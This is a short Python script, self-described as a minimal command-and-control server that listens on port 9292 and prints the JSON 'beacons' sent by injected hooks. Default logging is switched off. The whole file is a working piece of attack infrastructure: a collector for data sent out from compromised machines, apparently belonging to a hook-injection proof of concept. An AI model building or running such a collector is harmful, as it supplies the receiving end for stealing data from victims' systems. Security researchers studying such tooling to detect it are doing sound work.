#!/usr/bin/env python3
"""Minimal C2 server — receives and displays hook injection beacons."""
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime


class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        try:
            data = json.loads(body)
        except Exception:
            data = {"raw": body}

        print(f"\n\033[1;31m[BEACON]\033[0m {datetime.now().isoformat()}")
        for k, v in data.items():
            print(f"  \033[1m{k}\033[0m: {v}")

        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass  # suppress default logging


if __name__ == "__main__":
    port = 9292
    print(f"\033[1;32m[C2]\033[0m Listening on :{port}")
    HTTPServer(("", port), C2Handler).serve_forever()
